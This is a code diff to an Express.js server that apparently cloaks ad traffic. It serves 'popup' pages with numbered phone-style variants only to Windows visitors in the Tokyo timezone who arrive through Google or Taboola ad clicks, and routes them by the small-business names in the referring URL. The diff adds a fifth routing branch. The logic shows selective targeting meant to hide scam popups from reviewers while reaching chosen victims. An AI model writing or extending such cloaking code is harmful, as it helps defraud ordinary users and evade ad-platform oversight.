@@ -5,9 +5,10 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 const firstList = ["yuuyuuyoga", "yumikoresorts", "yogalex", "sakurasuhiandramenbar", "osakastreetbites", "sakuracoffee", "yumimasseuse", "wash-o-kuan", "hanasakuniwa"];
-const secondList = ["hanamionsen",  "komorebiyoga", "seishinyogajp", "shoppiejapanclothes"];
+const secondList = ["komorebiyoga", "seishinyogajp", "shoppiejapanclothes"];
 const thirdList = ["adventourjp", "spa-delightjp", "tatsumionsen", "yogametic"];
 const fourthList = ["hdjavforyou", "javhdaffiliates"];
+const fifthList = ["hanamionsen"];
 
 // Base domains for allowed origins and referrers
 const baseDomains = [
@@ -96,13 +97,15 @@ app.post("/", (req, res) => {
   if (isWindowsOS(userAgent) && isTokyoTimezone && !containsExcludedGclid(fullUrl) && (fullUrl?.includes('gclid') || fullUrl?.includes('taboola') || fullUrl?.includes('tx'))) {
     console.log('popupsent');
     if (firstList.some(item => fullUrl.includes(item))) {
-      res.sendFile(path.join(__dirname, "altmod.html"));
+      res.sendFile(path.join(__dirname, "index.html"));
     } else if (secondList.some(item => fullUrl.includes(item))) {
       res.sendFile(path.join(__dirname, "secondNumber.html"));
     } else if (thirdList.some(item => fullUrl.includes(item))) {
       res.sendFile(path.join(__dirname, "thirdNumber.html"));
-    } else {
+    } else if (fourthList.some(item => fullUrl.includes(item))) {
       res.sendFile(path.join(__dirname, "fourthNumber.html"));
+    } else {
+      res.sendFile(path.join(__dirname, "fifthNumber.html"));
     }
   } else {
     console.log('popup not sent');
